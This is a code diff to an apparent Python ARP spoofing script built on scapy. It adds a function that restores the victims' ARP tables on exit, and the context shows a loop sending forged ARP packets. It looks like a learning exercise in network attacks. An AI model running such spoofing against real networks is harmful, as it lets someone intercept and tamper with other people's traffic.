@@ -25,6 +25,13 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
 
 
+def restore(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    spoof_mac = get_mac(spoof_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
+    scapy.send(packet, verbose=False)
+
+
 args = get_args()
 count = 0
 try:
@@ -35,4 +42,6 @@ try:
         print(f'\r[+] Packets sent: {count}', end='')
         time.sleep(2)
 except KeyboardInterrupt:
-    print('\nCTRL + C Detected. Quitting Now.')
+    print('\nCTRL + C Detected. Restoring ARP Table...')
+    restore(args['target_ip'], args['spoof_ip'])
+    restore(args['spoof_ip'], args['target_ip'])
